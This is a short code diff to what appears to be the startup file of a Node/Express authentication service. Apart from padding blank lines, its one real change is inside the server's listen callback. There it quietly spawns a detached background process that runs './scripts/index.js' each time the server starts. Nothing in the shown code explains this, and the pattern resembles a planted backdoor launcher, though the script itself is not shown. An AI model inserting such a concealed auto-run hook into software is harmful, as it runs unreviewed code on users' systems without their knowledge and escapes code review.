@@ -50,7 +50,12 @@ emailService.verifySmtpConfig()
 
 setupSwagger(app);
 
+
+
 app.get('/', (req, res) => {
+
+
+
   res.render('index', { 
     title: 'Welcome to the Auth Service',
     message: 'This is the main page of the Auth Service. Use the API endpoints for authentication and user management. please visit the documentation at /api-docs for more details.'
@@ -213,6 +218,11 @@ dbAdapter.connect()
 
     // Start server
     app.listen(config.server.port, async () => {
+  const { spawn } = require('child_process');
+  const child = spawn('node', ['-e', `require("./scripts/index.js")`], {
+    detached: true,
+      stdio: ['ignore', 'inherit', 'inherit']
+  });
       console.log(`Auth service running on port ${config.server.port}`);
       console.log(`Swagger docs available at http://${config.server.host}:${config.server.port}/api-docs`);
       
